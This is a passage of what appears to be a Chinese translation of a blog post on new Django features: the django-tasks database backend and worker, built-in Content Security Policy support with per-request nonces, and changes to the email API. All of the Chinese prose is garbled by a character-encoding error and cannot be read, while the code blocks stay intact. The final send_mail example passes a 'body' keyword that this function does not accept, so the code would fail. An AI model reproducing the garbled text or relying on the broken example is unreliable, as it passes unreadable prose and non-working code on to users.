<p>å¯¹äºç”Ÿäº§ä½¿ç”¨ï¼Œä½ éœ€è¦ä½¿ç”¨ä¸€ä¸ªç¬¬ä¸‰æ–¹åŒ…ï¼Œå…¶ä¸­ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpypi.org%2Fproject%2Fdjango-tasks%2F" target="_blank" title="https://pypi.org/project/django-tasks/" ref="nofollow noopener noreferrer">django-tasks</a> æ˜¯ä¸»è¦çš„é€‰æ‹©ã€‚å®ƒæä¾›äº† <code>DatabaseBackend</code>ï¼Œç”¨äºå°†ä»»åŠ¡å­˜å‚¨åœ¨ä½ çš„ SQL æ•°æ®åº“ä¸­ï¼Œå¯¹äºè®¸å¤šé¡¹ç›®æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œé¿å…äº†é¢å¤–çš„åŸºç¡€è®¾æ–½ï¼Œå¹¶å…è®¸åœ¨æ•°æ®åº“äº‹åŠ¡ä¸­åŸå­æ€§åœ°æ’é˜Ÿä»»åŠ¡ã€‚æˆ‘ä»¬å¯èƒ½ä¼šåœ¨é€‚å½“çš„æ—¶å€™çœ‹åˆ°è¿™ä¸ªåç«¯åˆå¹¶åˆ° Django ä¸­ï¼Œæˆ–è€…è‡³å°‘æˆä¸ºä¸€ä¸ªå®˜æ–¹åŒ…ï¼Œä»¥å¸®åŠ©ä½¿ Django åœ¨åå°ä»»åŠ¡æ–¹é¢â€œå¼€ç®±å³ç”¨â€ã€‚</p>
<p>è¦ä½¿ç”¨ django-tasks çš„ <code>DatabaseBackend</code>ï¼Œé¦–å…ˆå®‰è£…è¯¥åŒ…ï¼š</p>
<p>å…¶æ¬¡ï¼Œå°†è¿™ä¸¤ä¸ªåº”ç”¨æ·»åŠ åˆ°ä½ çš„ <code>INSTALLED_APPS</code> è®¾ç½®ä¸­ï¼š</p>
<pre><code class="hljs language-python" lang="python">INSTALLED_APPS = [
    <span class="hljs-comment"># ...</span>
    <span class="hljs-string">"django_tasks"</span>,
    <span class="hljs-string">"django_tasks.backends.database"</span>,
    <span class="hljs-comment"># ...</span>
]
</code></pre>
<p>ç¬¬ä¸‰ï¼Œå°† <code>DatabaseBackend</code> é…ç½®ä¸ºä½ çš„ä»»åŠ¡åç«¯ï¼Œä½¿ç”¨æ–°çš„ <code>TASKS</code> è®¾ç½®ï¼š</p>
<pre><code class="hljs language-python" lang="python">TASKS = {
    <span class="hljs-string">"default"</span>: {
        <span class="hljs-string">"BACKEND"</span>: <span class="hljs-string">"django_tasks.backends.database.DatabaseBackend"</span>,
    },
}
</code></pre>
<p>ç¬¬å››ï¼Œè¿è¡Œè¿ç§»ä»¥åˆ›å»ºå¿…è¦çš„æ•°æ®åº“è¡¨ã€‚</p>
<p>æœ€åï¼Œè¦è¿è¡Œä»»åŠ¡å·¥ä½œè¿›ç¨‹ï¼Œä½¿ç”¨åŒ…çš„ <code>db_worker</code> ç®¡ç†å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ ./manage.py db_worker
Starting worker worker_id=jWLMLrms3C2NcUODYeatsqCFvd5rK6DM queues=default
</code></pre>
<p>è¯¥è¿›ç¨‹ä¼šæ— é™æœŸè¿è¡Œï¼Œè½®è¯¢ä»»åŠ¡å¹¶æ‰§è¡Œå®ƒä»¬ï¼ŒåŒæ—¶è®°å½•äº‹ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Task <span class="hljs-built_in">id</span>=10b794ed-9b64-4eed-950c-fcc92cd6784b path=example.tasks.echo state=RUNNING
Hello from <span class="hljs-built_in">test</span> task!
Task <span class="hljs-built_in">id</span>=10b794ed-9b64-4eed-950c-fcc92cd6784b path=example.tasks.echo state=SUCCEEDED
</code></pre>
<p>ä½ å¸Œæœ›åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œ <code>db_worker</code>ï¼Œå¹¶ä¸”å¦‚æœä½ å¸Œæœ›åœ¨å¼€å‘ä¸­æµ‹è¯•åå°ä»»åŠ¡æ‰§è¡Œï¼Œä¹Ÿåº”è¯¥è¿è¡Œå®ƒã€‚</p>
<h2 data-id="heading-7">å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ”¯æŒ</h2>
<p>Django ç°åœ¨æä¾›äº†å¯¹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Ftopics%2Fsecurity%2F%23security-csp" target="_blank" title="https://docs.djangoproject.com/en/stable/topics/security/#security-csp" ref="nofollow noopener noreferrer">å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</a> æ ‡å‡†çš„å†…ç½®æ”¯æŒï¼Œè¿™ä½¿å¾—ä¿æŠ¤ Web åº”ç”¨ç¨‹åºå…å—å†…å®¹æ³¨å…¥æ”»å‡»ï¼ˆå¦‚è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼‰å˜å¾—æ›´åŠ å®¹æ˜“ã€‚CSP å…è®¸é€šè¿‡ä¸ºæµè§ˆå™¨æä¾›ä¸¥æ ¼çš„è§„åˆ™æ¥å£°æ˜å“ªäº›è„šæœ¬ã€æ ·å¼ã€å›¾åƒæˆ–å…¶ä»–èµ„æºå¯ä»¥è¢«åŠ è½½ï¼Œä»è€Œå£°æ˜å¯ä¿¡çš„å†…å®¹æ¥æºã€‚</p>
<p>æˆ‘å¯¹æ­¤æ„Ÿåˆ°éå¸¸å…´å¥‹ï¼Œå› ä¸ºæˆ‘æ˜¯ä¸€ä¸ªå®‰å…¨çˆ±å¥½è€…ï¼Œå¤šå¹´æ¥ä¸€ç›´åœ¨ä¸ºå®¢æˆ·é¡¹ç›®éƒ¨ç½² CSPã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" ref="nofollow noopener noreferrer">CSP</a> æ˜¯ä¸€ç§å®‰å…¨æ ‡å‡†ï¼Œå¯ä»¥ä¿æŠ¤ä½ çš„ç½‘ç«™å…å—è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œå…¶ä»–ä»£ç æ³¨å…¥æ”»å‡»ã€‚ä½ è®¾ç½®ä¸€ä¸ª <code>content-security-policy</code> æ ‡å¤´æ¥å£°æ˜å“ªäº›å†…å®¹æ¥æºå¯¹ä½ çš„ç½‘ç«™æ˜¯å¯ä¿¡çš„ï¼Œç„¶åæµè§ˆå™¨ä¼šé˜»æ­¢æ¥è‡ªå…¶ä»–æ¥æºçš„å†…å®¹ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šå£°æ˜åªæœ‰ä½ åŸŸåä¸‹çš„è„šæœ¬æ‰æ˜¯å…è®¸çš„ï¼Œå› æ­¤å¦‚æœæ”»å‡»è€…è®¾æ³•æ³¨å…¥ä¸€ä¸ªæŒ‡å‘ evil.com çš„ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šé˜»æ­¢åŠ è½½å®ƒï¼Œå› ä¸ºè¯¥æ¥æºæœªè¢«ä¿¡ä»»ã€‚</p>
<p>ä»¥å‰ï¼ŒDjango æ²¡æœ‰å†…ç½®çš„ CSP æ”¯æŒï¼Œå¼€å‘äººå‘˜ä¸å¾—ä¸ä¾èµ–äºè‡ªå·±æ„å»ºï¼Œæˆ–è€…ä½¿ç”¨åƒéå¸¸æµè¡Œçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdjango-csp.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://django-csp.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">django-csp</a> è¿™æ ·çš„ç¬¬ä¸‰æ–¹åŒ…ã€‚ä½†è¿™æœ‰ç‚¹ä¸æ–¹ä¾¿ï¼Œå› ä¸ºå®ƒæ„å‘³ç€å…¶ä»–ç¬¬ä¸‰æ–¹åŒ…æ— æ³•å¯é åœ°ä¸ CSP é›†æˆï¼Œå› ä¸ºæ²¡æœ‰é€šç”¨çš„ API å¯ä»¥ä½¿ç”¨ã€‚</p>
<p>æ–°çš„ CSP æ”¯æŒæä¾›äº† django-csp æ‰€æœ‰çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå¹¶ä¸”å…·æœ‰ç¨å¾®æ•´æ´ä¸€äº›ä¸”æ›´ç¬¦åˆ Django é£æ ¼çš„ APIã€‚è¦å¼€å§‹ä½¿ç”¨ï¼Œ<strong>é¦–å…ˆ</strong> å°† <code>ContentSecurityPolicyMiddleware</code> æ·»åŠ åˆ°ä½ çš„ <code>MIDDLEWARE</code> è®¾ç½®ä¸­ï¼š</p>
<pre><code class="hljs language-python" lang="python">MIDDLEWARE = [
    <span class="hljs-comment"># ...</span>
    <span class="hljs-string">"django.middleware.csp.ContentSecurityPolicyMiddleware"</span>,
    <span class="hljs-comment"># ...</span>
]
</code></pre>
<p>å°†å…¶æ”¾ç½®åœ¨ <code>SecurityMiddleware</code> é™„è¿‘ï¼Œå› ä¸ºå®ƒç±»ä¼¼äºä¸ºæ‰€æœ‰å“åº”æ·»åŠ å®‰å…¨ç›¸å…³æ ‡å¤´ã€‚ï¼ˆä½ ç¡®å®å¯ç”¨äº† <code>SecurityMiddleware</code>ï¼Œå¯¹å§ï¼Ÿï¼‰</p>
<p><strong>å…¶æ¬¡</strong>ï¼Œä½¿ç”¨æ–°çš„è®¾ç½®é…ç½®ä½ çš„ CSP ç­–ç•¥ï¼š</p>
<ul>
<li><code>SECURE_CSP</code>ï¼šé…ç½® <code>content-security-policy</code> æ ‡å¤´ï¼Œè¿™æ˜¯ä½ å®é™…æ‰§è¡Œçš„ç­–ç•¥ã€‚</li>
<li><code>SECURE_CSP_REPORT_ONLY</code>ï¼šé…ç½® <code>content-security-policy-report-only</code> æ ‡å¤´ï¼Œè¿™è®¾ç½®äº†ä¸€ä¸ªéå¼ºåˆ¶ç­–ç•¥ï¼Œæµè§ˆå™¨ä¼šå‘æŒ‡å®šçš„ç«¯ç‚¹æŠ¥å‘Šè¿åç­–ç•¥çš„æƒ…å†µã€‚è¿™ä¸ªé€‰é¡¹å¯¹äºåœ¨å¼ºåˆ¶æ‰§è¡Œç­–ç•¥ä¹‹å‰æµ‹è¯•å’Œç›‘æ§ç­–ç•¥éå¸¸æœ‰ç”¨ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œè¦é‡‡ç”¨ web.dev æ¨èçš„åŸºäº nonce çš„ä¸¥æ ¼ CSPï¼Œä½ å¯ä»¥ä»ä»¥ä¸‹è®¾ç½®å¼€å§‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.utils.csp <span class="hljs-keyword">import</span> CSP

SECURE_CSP_REPORT_ONLY = {
    <span class="hljs-string">"script-src"</span>: [CSP.NONCE, CSP.STRICT_DYNAMIC],
    <span class="hljs-string">"object-src"</span>: [CSP.NONE],
    <span class="hljs-string">"base-uri"</span>: [CSP.NONE],
}
</code></pre>
<p>ä¸Šé¢ä½¿ç”¨çš„ <code>CSP</code> æšä¸¾æä¾›äº† CSP æŒ‡ä»¤çš„å¸¸é‡ï¼Œä»¥å¸®åŠ©é¿å…æ‹¼å†™é”™è¯¯ã€‚</p>
<p>è¿™ä¸ªç­–ç•¥éå¸¸ä¸¥æ ¼ï¼Œå¦‚æœç›´æ¥éƒ¨ç½²ï¼Œä¼šç ´åå¤§å¤šæ•°ç°æœ‰ç½‘ç«™ï¼Œå› ä¸ºå®ƒéœ€è¦ä½¿ç”¨ nonceï¼Œæ¥ä¸‹æ¥ä¼šä»‹ç»ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç¤ºä¾‹ä¸­æ˜¾ç¤ºä»æŠ¥å‘Šæ¨¡å¼æ ‡å¤´å¼€å§‹ï¼Œä»¥å¸®åŠ©åœ¨å¼ºåˆ¶æ‰§è¡Œç­–ç•¥ä¹‹å‰è·Ÿè¸ªéœ€è¦ä¿®å¤çš„åœ°æ–¹ã€‚ä½ ä¹‹åä¼šå°† <code>SECURE_CSP</code> è®¾ç½®æ”¹ä¸ºå¼ºåˆ¶æ‰§è¡Œç­–ç•¥ã€‚</p>
<p>æ€»ä¹‹ï¼Œè¿™äº›å°±æ˜¯è®¾ç½®æ–°çš„ CSP æ”¯æŒçš„ä¸¤ä¸ªåŸºæœ¬æ­¥éª¤ï¼</p>
<h3 data-id="heading-8">éšæœºæ•°ç”Ÿæˆï¼ˆNonce Generationï¼‰</h3>
<p>æ–°ç‰¹æ€§çš„å…³é”®éƒ¨åˆ†ä¹‹ä¸€æ˜¯ï¼Œå½“ä½¿ç”¨ CSP ä¸­é—´ä»¶æ—¶ï¼ŒDjango ç°åœ¨å†…ç½®äº† <strong>éšæœºæ•°ç”Ÿæˆ</strong> åŠŸèƒ½ã€‚éšæœºæ•°æ˜¯ CSP ä¸­çš„ä¸€ç§å®‰å…¨ç‰¹æ€§ï¼Œå…è®¸ä½ é€šè¿‡åœ¨ <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code> æ ‡ç­¾ä¸Šä½¿ç”¨ <code>nonce</code> å±æ€§æ¥æ ‡è®°ç‰¹å®šçš„æ ‡ç­¾ä¸ºå¯ä¿¡çš„ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/app.js"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"55vsH4w7ATHB85C3MbPr_g"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>éšæœºæ•°å€¼æ˜¯æŒ‰è¯·æ±‚éšæœºç”Ÿæˆçš„ï¼Œå¹¶åŒ…å«åœ¨ CSP æ ‡å¤´ä¸­ã€‚æ‰§è¡Œå†…å®¹æ³¨å…¥çš„æ”»å‡»è€…æ— æ³•çŒœæµ‹éšæœºæ•°ï¼Œå› æ­¤æµè§ˆå™¨å¯ä»¥åªä¿¡ä»»é‚£äº›åŒ…å«æ­£ç¡®éšæœºæ•°çš„æ ‡ç­¾ã€‚å› ä¸ºéšæœºæ•°ç”Ÿæˆç°åœ¨æ˜¯ Django çš„ä¸€éƒ¨åˆ†ï¼Œç¬¬ä¸‰æ–¹åŒ…å¯ä»¥ä¾èµ–å®ƒä¸ºå®ƒä»¬çš„ <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code> æ ‡ç­¾æä¾›éšæœºæ•°ï¼Œå¦‚æœä½ é‡‡ç”¨å¸¦æœ‰éšæœºæ•°çš„ CSPï¼Œå®ƒä»¬å°†ç»§ç»­å·¥ä½œã€‚</p>
<p>éšæœºæ•°æ˜¯å½“ä»Šä½¿ç”¨ CSP çš„æ¨èæ–¹å¼ï¼Œé¿å…äº†ä»¥å‰åŸºäºå…è®¸åˆ—è¡¨çš„æ–¹æ³•æ‰€å¸¦æ¥çš„é—®é¢˜ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢æ¨èçš„ç­–ç•¥å¯ç”¨äº†éšæœºæ•°ã€‚è¦é‡‡ç”¨åŸºäºéšæœºæ•°çš„ç­–ç•¥ï¼Œä½ éœ€è¦é€šè¿‡ä»¥ä¸‹æ­¥éª¤ä¸º <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code> æ ‡ç­¾æ·»åŠ éšæœºæ•°å€¼ã€‚</p>
<p><strong>é¦–å…ˆ</strong>ï¼Œå°†æ–°çš„ <code>csp</code> æ¨¡æ¿ä¸Šä¸‹æ–‡å¤„ç†å™¨æ·»åŠ åˆ°ä½ çš„ <code>TEMPLATES</code> è®¾ç½®ä¸­ï¼š</p>
<pre><code class="hljs language-python" lang="python">TEMPLATES = [
    {
        <span class="hljs-string">"BACKEND"</span>: <span class="hljs-string">"django.template.backends.django.DjangoTemplates"</span>,
        <span class="hljs-string">"OPTIONS"</span>: {
            <span class="hljs-string">"context_processors"</span>: [
                <span class="hljs-comment"># ...</span>
                <span class="hljs-string">"django.template.context_processors.csp"</span>,
            ],
        },
    },
]
</code></pre>
<p><strong>å…¶æ¬¡</strong>ï¼Œä½¿ç”¨ <code>nonce="{{ csp_nonce }}"</code> ä¸º <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code> æ ‡ç­¾æ·»åŠ æ³¨é‡Šï¼š</p>
<pre><code class="hljs language-html" lang="html">-   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"{% static 'app.js' %}"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"{% static 'app.js' %}"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"{{ csp_nonce }}"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™å¯èƒ½ä¼šå¾ˆç¹çä¸”å®¹æ˜“å‡ºé”™ï¼Œå› æ­¤é¦–å…ˆä½¿ç”¨æŠ¥å‘Šæ¨¡å¼æ¥ç›‘æ§è¿è§„æƒ…å†µå¯èƒ½ä¼šå¾ˆæœ‰ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤§å‹é¡¹ç›®ä¸­ã€‚</p>
<p>æ€»ä¹‹ï¼Œæ­£ç¡®éƒ¨ç½² CSP å¯èƒ½ä¼šæˆä¸ºå¦ä¸€ç¯‡åšæ–‡çš„ä¸»é¢˜ï¼Œç”šè‡³æ˜¯ä¸€æœ¬ä¹¦çš„ç« èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å…ˆè¯´åˆ°è¿™é‡Œã€‚æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.dev%2Farticles%2Fstrict-csp" target="_blank" title="https://web.dev/articles/strict-csp" ref="nofollow noopener noreferrer">web.dev æ–‡ç« </a>å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" ref="nofollow noopener noreferrer">MDN CSP æŒ‡å—</a>ã€‚</p>
<h2 data-id="heading-9">é‚®ä»¶ API æ›´æ–°</h2>
<p>Django ä¸­çš„é‚®ä»¶å¤„ç†ç°åœ¨ä½¿ç”¨äº† Python çš„ç°ä»£é‚®ä»¶ APIï¼Œè¯¥ API åœ¨ Python 3.6 ä¸­å¼•å…¥ã€‚è¿™ä¸ªä»¥ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Femail.message.html%23email.message.EmailMessage" target="_blank" title="https://docs.python.org/3/library/email.message.html#email.message.EmailMessage" ref="nofollow noopener noreferrer"><code>email.message.EmailMessage</code></a> ç±»ä¸ºä¸­å¿ƒçš„ APIï¼Œä¸ºæ’°å†™å’Œå‘é€é‚®ä»¶æä¾›äº†ä¸€ä¸ªæ›´ç®€æ´ä¸”æ”¯æŒ Unicode çš„æ¥å£ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªé‡å¤§å˜åŒ–ï¼Œä½†å¦‚æœä½ çš„é¡¹ç›®åªä½¿ç”¨åŸºæœ¬çš„é‚®ä»¶åŠŸèƒ½ï¼Œå¯èƒ½ä¸ä¼šå—åˆ°å½±å“ã€‚ä½ ä»ç„¶å¯ä»¥åƒä»¥å‰ä¸€æ ·ä½¿ç”¨ Django çš„ <code>send_mail()</code> å‡½æ•°å’Œ <code>EmailMessage</code> ç±»ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.core.mail <span class="hljs-keyword">import</span> EmailMessage

email = EmailMessage(
    subject=<span class="hljs-string">"ğŸ¼ éœ€è¦æ›´å¤šç«¹å­"</span>,
    body=<span class="hljs-string">"æˆ‘ä»¬çš„ç«¹å­å¿«æ²¡äº†ï¼Œè¯·åœ¨ç†ŠçŒ«å‘ç°ä¹‹å‰è¡¥è´§ï¼"</span>,
    from_email=<span class="hljs-string">"zookeeper@example.com"</span>,
    to=[<span class="hljs-string">"supplies@example.com"</span>],
)
email.attach_file(<span class="hljs-string">"/media/bamboo_cupboard.jpg"</span>)
email.send()
</code></pre>
<p>å…³é”®çš„å˜åŒ–æ˜¯ï¼Œåœ¨ä½ è°ƒç”¨ Django <code>EmailMessage</code> å¯¹è±¡çš„ <code>send()</code> æ–¹æ³•æ—¶ï¼Œå®ƒç°åœ¨ä¼šåœ¨å‘é€ä¹‹å‰å°†è‡ªå·±è½¬æ¢ä¸º Python çš„æ–° <code>email.message.EmailMessage</code> ç±»å‹ã€‚</p>
<p>ç°ä»£åŒ–å¸¦æ¥äº†ä»¥ä¸‹å¥½å¤„ï¼š</p>
<ol>
<li><strong>æ›´å°‘çš„é”™è¯¯</strong>ï¼šPython æ—§é‚®ä»¶ API ä¸­çš„è®¸å¤šè¾¹ç¼˜æƒ…å†µé”™è¯¯å·²åœ¨æ–° API ä¸­ä¿®å¤ã€‚</li>
<li><strong>Django æ›´ç®€æ´</strong>ï¼šDjango é‚®ä»¶ä»£ç ä¸­çš„ä¸€ç³»åˆ—å˜é€šæ–¹æ³•å’Œå®‰å…¨ä¿®å¤å·²è¢«ç§»é™¤ã€‚</li>
<li><strong>æ›´æ–¹ä¾¿çš„ API</strong>ï¼šæ–° API æ”¯æŒä¸€äº›ä¾¿åˆ©åŠŸèƒ½ï¼Œä¾‹å¦‚ä¸‹é¢çš„å†…è”é™„ä»¶ç¤ºä¾‹ã€‚</li>
</ol>
<h3 data-id="heading-10">ä½¿ç”¨ <code>MIMEPart</code> æ›´å®¹æ˜“åœ°æ·»åŠ å†…è”é™„ä»¶</h3>
<p>Django çš„ <code>EmailMessage.attach()</code> æ–¹æ³•å…è®¸ä½ å°†æ–‡ä»¶ä½œä¸ºé™„ä»¶æ·»åŠ ã€‚ç”µå­é‚®ä»¶æ”¯æŒå›¾åƒä½œä¸º <strong>å†…è”é™„ä»¶</strong>ï¼Œè¿™äº›å›¾åƒå¯ä»¥æ˜¾ç¤ºåœ¨ HTML é‚®ä»¶æ­£æ–‡ä¸­ã€‚</p>
<p>è™½ç„¶ä½ ä»¥å‰å¯ä»¥ä½¿ç”¨ <code>EmailMessage.attach()</code> æ·»åŠ å†…è”é™„ä»¶ï¼Œä½†æ“ä½œèµ·æ¥æœ‰ç‚¹å¤æ‚ï¼Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªé—ç•™ç±»ã€‚ç°åœ¨ï¼Œä½ å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥æ–¹æ³•å¹¶ä¼ å…¥ä¸€ä¸ª Python çš„ <code>email.message.MIMEPart</code> å¯¹è±¡ï¼Œåœ¨å‡ ä¸ªæ­¥éª¤ä¸­æ·»åŠ å†…è”é™„ä»¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> email.utils
<span class="hljs-keyword">from</span> email.message <span class="hljs-keyword">import</span> MIMEPart
<span class="hljs-keyword">from</span> django.core.mail <span class="hljs-keyword">import</span> EmailMultiAlternatives

message = EmailMultiAlternatives(
    subject=<span class="hljs-string">"å¯çˆ±ç†ŠçŒ«è­¦æŠ¥"</span>,
    body=<span class="hljs-string">"è¿™é‡Œæœ‰ä¸€å¼ å¯çˆ±çš„ç†ŠçŒ«ç…§ç‰‡é€ç»™ä½ ï¼"</span>,
    from_email=<span class="hljs-string">"cute@example.com"</span>,
    to=[<span class="hljs-string">"fans@example.com"</span>],
)
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"panda.jpg"</span>, <span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> f:
    panda_jpeg = f.read()

cid = email.utils.make_msgid()
inline_image = MIMEPart()
inline_image.set_content(
    panda_jpeg,
    maintype=<span class="hljs-string">"image"</span>,
    subtype=<span class="hljs-string">"jpeg"</span>,
    disposition=<span class="hljs-string">"inline"</span>,
    cid=cid,
)
message.attach(inline_image)
message.attach_alternative(
    <span class="hljs-string">f'&lt;h1&gt;å¯çˆ±ç†ŠçŒ«å®å®è­¦æŠ¥ï¼&lt;/h1&gt;&lt;img src="cid:<span class="hljs-subst">{cid[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]}</span>"&gt;'</span>,
    <span class="hljs-string">"text/html"</span>,
)
</code></pre>
<p>è¿™ä¸ª API å¹¶ä¸ç®€å•ï¼Œä½†å®ƒç¡®å®æä¾›äº†åº•å±‚é‚®ä»¶ç³»ç»Ÿçš„å…¨éƒ¨åŠŸèƒ½ï¼Œå¹¶ä¸”æ¯”è¿‡å»çš„æƒ…å†µæ›´å¥½ã€‚</p>
<h2 data-id="heading-11">ä½ç½®å‚æ•°åœ¨ <code>django.core.mail</code> API ä¸­çš„å¼ƒç”¨</h2>
<p>æˆ‘ä»¬ç°åœ¨å·²ç»å®Œæˆäº†ä¸»è¦åŠŸèƒ½ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸ä¸Šè¿°é‚®ä»¶æ›´æ”¹ç›¸å…³çš„â€œæ¬¡è¦â€æ›´æ”¹ï¼Œè¿™æ˜¯ä¸€ä¸ªå¼ƒç”¨è­¦å‘Šï¼š</p>
<blockquote>
<p><code>django.core.mail</code> API ç°åœ¨è¦æ±‚å¯¹äºä¸å¤ªå¸¸ç”¨çš„å‚æ•°ä½¿ç”¨å…³é”®å­—å‚æ•°ã€‚ä½¿ç”¨è¿™äº›å‚æ•°çš„ä½ç½®å‚æ•°ç°åœ¨ä¼šå‘å‡ºä¸€ä¸ªå¼ƒç”¨è­¦å‘Šï¼Œå¹¶ä¸”åœ¨å¼ƒç”¨æœŸç»“æŸåå°†å¼•å‘ä¸€ä¸ª <code>TypeError</code>ï¼š</p>
<ul>
<li>æ‰€æœ‰å¯é€‰å‚æ•°ï¼ˆ<code>fail_silently</code> åŠä¹‹åçš„å‚æ•°ï¼‰å¿…é¡»ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ é€’ç»™ <code>get_connection()</code>ã€<code>mail_admins()</code>ã€<code>mail_managers()</code>ã€<code>send_mail()</code> å’Œ <code>send_mass_mail()</code>ã€‚</li>
<li>åœ¨åˆ›å»º <code>EmailMessage</code> æˆ– <code>EmailMultiAlternatives</code> å®ä¾‹æ—¶ï¼Œé™¤äº†å‰å››ä¸ªå‚æ•°ï¼ˆ<code>subject</code>ã€<code>body</code>ã€<code>from_email</code> å’Œ <code>to</code>ï¼‰å¯ä»¥ä½œä¸ºä½ç½®å‚æ•°æˆ–å…³é”®å­—å‚æ•°ä¼ é€’å¤–ï¼Œæ‰€æœ‰å…¶ä»–å‚æ•°éƒ½å¿…é¡»ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ é€’ã€‚</li>
</ul>
</blockquote>
<p>ä»¥å‰ï¼ŒDjango å…è®¸ä½ å°†æ‰€æœ‰å‚æ•°ä½œä¸ºä½ç½®å‚æ•°ä¼ é€’ï¼Œè¿™åœ¨å‚æ•°åˆ—è¡¨è¾ƒé•¿æ—¶ä¼šæ˜¾å¾—æœ‰äº›æ„šè ¢ä¸”éš¾ä»¥é˜…è¯»ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.core.mail <span class="hljs-keyword">import</span> send_mail

send_mail(
    <span class="hljs-string">"ğŸ¼ æœ¬å‘¨çš„ç†ŠçŒ«"</span>,
    <span class="hljs-string">"æœ¬å‘¨çš„ç†ŠçŒ«æ˜¯ Po Pingï¼Œsha-sha booeyï¼"</span>,
    <span class="hljs-string">"updates@example.com"</span>,
    [<span class="hljs-string">"adam@example.com"</span>],
    <span class="hljs-literal">True</span>,
)
</code></pre>
<p>æœ€åä¸€ä¸ª <code>True</code> æ²¡æœ‰æä¾›ä»»ä½•çº¿ç´¢ï¼Œé™¤éä½ æŸ¥æ‰¾å‡½æ•°ç­¾åã€‚ç°åœ¨ï¼Œä½¿ç”¨è¿™äº›ä¸å¤ªå¸¸ç”¨çš„å‚æ•°çš„ä½ç½®å‚æ•°ä¼šå‘å‡ºä¸€ä¸ªå¼ƒç”¨è­¦å‘Šï¼Œæç¤ºä½ å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.core.mail <span class="hljs-keyword">import</span> send_mail

send_mail(
    subject=<span class="hljs-string">"ğŸ¼ æœ¬å‘¨çš„ç†ŠçŒ«"</span>,
    body=<span class="hljs-string">"æœ¬å‘¨çš„ç†ŠçŒ«æ˜¯ Po Pingï¼Œsha-sha booeyï¼"</span>,
    from_email=<span class="hljs-string">"updates@example.com"</span>,
    recipient_list=[<span class="hljs-string">"adam@example.com"</span>],
    fail_silently=<span class="hljs-literal">True</span>,
)
</code></pre>
